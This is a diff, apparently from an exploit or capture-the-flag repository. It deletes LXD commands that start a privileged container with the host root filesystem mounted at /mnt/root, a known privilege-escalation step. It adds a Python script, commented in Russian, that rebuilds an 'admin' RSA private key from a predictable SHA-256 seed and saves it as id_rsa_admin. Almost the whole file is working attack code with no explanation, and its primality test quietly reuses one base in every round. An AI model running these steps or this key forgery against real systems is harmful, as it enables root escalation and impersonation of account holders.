@@ -1,3 +1,57 @@
-lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
-lxc init myimage ignite -c security.privileged=true
-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+import hashlib
+from Crypto.Util.number import bytes_to_long, inverse
+from Crypto.PublicKey import RSA
+
+# Конфигурация
+TARGET_USER = "admin" 
+
+def get_next_prime(n):
+    if n % 2 == 0: n += 1
+    while True:
+        if is_prime(n): return n
+        n += 2
+
+def is_prime(n, k=40):
+    if n == 2: return True
+    if n % 2 == 0: return False
+    r, s = 0, n - 1
+    while s % 2 == 0:
+        r += 1
+        s //= 2
+    for _ in range(k):
+        a = pow(2, s, n)
+        if a == 1 or a == n - 1: continue
+        for _ in range(r - 1):
+            a = pow(a, 2, n)
+            if a == n - 1: break
+        else: return False
+    return True
+
+# 1. Формируем Seed
+seed_str = f"{TARGET_USER}_lovenote_2026_valentine"
+seed_bytes = seed_str.encode()
+print(f"[*] Generating key for: {TARGET_USER}")
+print(f"[*] Seed: {seed_str}")
+
+# 2. Генерация P
+hash_p = hashlib.sha256(seed_bytes).digest()
+p = get_next_prime(bytes_to_long(hash_p))
+print(f"[*] Prime P found")
+
+# 3. Генерация Q (seed + "pki")
+hash_q = hashlib.sha256(seed_bytes + b"pki").digest()
+q = get_next_prime(bytes_to_long(hash_q))
+print(f"[*] Prime Q found")
+
+# 4. Сохранение ключа
+n = p * q
+e = 65537
+phi = (p - 1) * (q - 1)
+d = inverse(e, phi)
+key = RSA.construct((n, e, d, p, q))
+
+filename = f"id_rsa_{TARGET_USER}"
+with open(filename, "w") as f:
+    f.write(key.export_key().decode())
+
+print(f"[+] Key saved to {filename}")
